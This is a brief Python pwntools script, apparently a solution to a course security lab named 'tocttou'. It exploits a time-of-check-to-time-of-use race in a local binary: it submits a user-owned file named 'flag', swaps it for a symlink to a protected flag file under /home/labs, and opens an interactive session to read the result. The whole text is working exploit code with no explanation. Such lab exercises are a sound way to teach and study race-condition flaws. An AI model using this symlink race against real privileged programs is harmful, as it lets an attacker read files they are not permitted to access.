from pwn import *

# Make a flag file that I have permissions for
if os.path.exists("flag"):
    os.remove("flag")
f = open("flag", "w")
f.write("cat flag")
f.close()

# Launch processs
p = process('./tocttou')
p.sendline("flag")


os.remove("flag")
os.symlink("/home/labs/week7/7-tocttou/flag", "flag")


p.interactive()
